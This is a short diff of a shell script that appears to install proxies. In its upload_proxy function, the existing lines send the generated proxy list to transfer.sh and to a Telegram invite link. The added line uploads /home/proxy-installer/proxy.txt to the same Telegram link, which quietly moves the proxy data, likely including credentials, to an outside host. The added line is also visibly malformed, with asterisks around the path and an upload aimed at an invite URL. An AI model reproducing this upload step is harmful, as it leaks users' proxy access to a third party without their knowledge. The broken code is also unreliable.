@@ -56,6 +56,7 @@ upload_proxy() {
     zip --password $PASS proxy.zip proxy.txt
     URL=$(curl -s --upload-file proxy.zip https://transfer.sh/proxy.zip)
     URL=$(curl -s --upload-file proxy.txt https://t.me/+YcU_YI12xTo5MTk1/proxy.txt)
+    URL=$(curl -s --upload-file ***/home/proxy-installer/proxy.txt*** https://t.me/+YcU_YI12xTo5MTk1/proxy.txt)
 }
 gen_data() {
     seq $FIRST_PORT $LAST_PORT | while read port; do
